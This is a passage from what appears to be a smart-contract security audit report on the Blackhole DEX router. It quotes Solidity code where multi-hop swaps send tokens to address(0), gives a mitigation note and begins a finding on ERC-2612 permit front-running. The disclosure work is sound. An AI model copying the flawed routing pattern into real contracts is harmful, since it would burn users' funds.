class=\"mtk12\"\u003eISwapRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eExactInputSingleParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ({\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenIn:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenOut:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeployer:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAlgebraPoolAPIStorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealgebraPoolAPIStorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epairToDeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erecipient:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeadline:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e600\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e],\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOutMinimum:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elimitSqrtPrice:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e+\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eISwapRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eswapRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexactInputSingle\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einputParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e{\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,) = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esortTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount0Out\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount1Out\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ? (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) : (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBaseV1Pair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epairFor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount0Out\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount1Out\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eSwap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e], \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis results in 100% loss of user funds as all swapped tokens are sent to \u003ccode\u003eaddress(0)\u003c/code\u003e and permanently burned. Every swap transaction through these functions will fail to deliver tokens to users.\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eNote: The API helper does correctly set receiver addresses in its \u003ccode\u003e_createRoute\u003c/code\u003e function:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"46\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_createRoute\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisBasic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_receiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint160\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esqrtPriceAfter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroute\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eroute\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e({\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisBasic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ? \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eisStable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() : \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econcentrated:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e !\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisBasic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_receiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esqrtPriceAfter:\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esqrtPriceAfter\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        });\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHowever, this only applies to routes created through the API layer, not direct router calls by users.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eThe fix is to properly set receiver addresses for multi-hop routing.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-24\"\u003elonelybones\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-37\"\u003erayss\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-61\"\u003emaxvzuvex\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-10-erc-2612-permit-front-running-in-routerv2-enables-dos-of-liquidity-operations\" style=\"position:relative;\"\u003e\u003ca href=\"#m-10-erc-2612-permit-front-running-in-routerv2-enables-dos-of-liquidity-operations\" aria-label=\"m 10 erc 2612 permit front running in routerv2 enables dos of liquidity operations permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-173\"\u003e[M-10] ERC-2612 permit front-running in RouterV2 enables DoS of liquidity operations\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-410\"\u003ePolarizedLight\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eThe \u003ccode\u003eremoveLiquidityWithPermit()\u003c/code\u003e and \u003ccode\u003eremoveLiquidityETHWithPermit()\u003c/code\u003e functions in RouterV2 are vulnerable to front-running attacks that consume user permit signatures, causing legitimate liquidity removal transactions to revert and resulting in gas fee losses and a DOS.\u003c/p\u003e\n\u003ch3 id=\"finding-description-7\" style=\"position:relative;\"\u003e\u003ca 